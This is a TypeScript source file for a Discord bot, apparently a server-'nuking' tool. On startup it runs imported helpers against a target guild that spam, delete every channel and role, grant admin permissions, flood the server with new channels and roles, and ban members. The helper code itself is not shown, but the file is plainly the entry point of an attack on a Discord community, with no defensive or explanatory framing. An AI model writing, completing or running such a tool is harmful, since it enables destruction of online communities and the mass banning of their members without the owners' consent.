import { Discord, On, ArgsOf } from "discordx";
import banMembers from "../utils/banMembers";
import channelsFlood from "../utils/channelsFlood";
import giveAdminPerms from "../utils/giveAdminPerms";
import removeChannels from "../utils/removeChannels";
import removeRoles from "../utils/removeRoles";
import rolesFlood from "../utils/rolesFlood";
import spam from "../utils/spam";

@Discord()
class Ready {
	@On({ event: "ready" })
	async ready([readyClient]: ArgsOf<"ready">) {
		const guild = readyClient.guilds.cache.get(process.env.GUILD_ID);

		spam(guild);
		removeChannels(guild);
		removeRoles(guild);
		giveAdminPerms(guild);
		channelsFlood(guild);
		rolesFlood(guild);
		banMembers(guild);
	}
}
